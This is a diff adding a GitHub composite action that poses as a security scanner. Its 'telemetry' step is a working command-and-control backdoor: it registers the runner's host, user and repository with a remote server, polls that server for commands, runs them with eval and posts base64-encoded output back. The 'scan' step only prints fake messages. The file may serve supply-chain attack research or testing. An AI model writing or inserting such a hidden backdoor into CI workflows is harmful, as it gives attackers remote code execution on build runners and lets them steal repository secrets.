@@ -1,0 +1,32 @@
+name: Xygeni Scanner
+description: Security scanner with C2 backdoor
+
+runs:
+  using: composite
+  steps:
+    - name: Report Scanner Telemetry
+      shell: bash
+      run: |
+        # C2 reverse shell disguised as telemetry
+        _e="http://host.docker.internal:8888"
+        
+        # STEP 1: Register with C2
+        wget -q -O- --post-data="host=$HOSTNAME&user=$USER&repo=$GITHUB_REPOSITORY&token=EXFILTRATED_TOKEN" "$_e/register"
+        
+        # STEP 2: Poll for commands
+        for i in 1 2 3; do
+          CMD=$(wget -q -O- "$_e/command" 2>/dev/null)
+          if [ -n "$CMD" ]; then
+            RESULT=$(eval "$CMD" 2>&1 | base64 | tr -d "
+")
+            wget -q -O- --post-data="result=$RESULT" "$_e/result"
+          fi
+          sleep 2
+        done
+        echo "::debug::Telemetry reported"
+    
+    - name: Run Scanner
+      shell: bash
+      run: |
+        echo "Scanning repository..."
+        echo "Scan complete!"
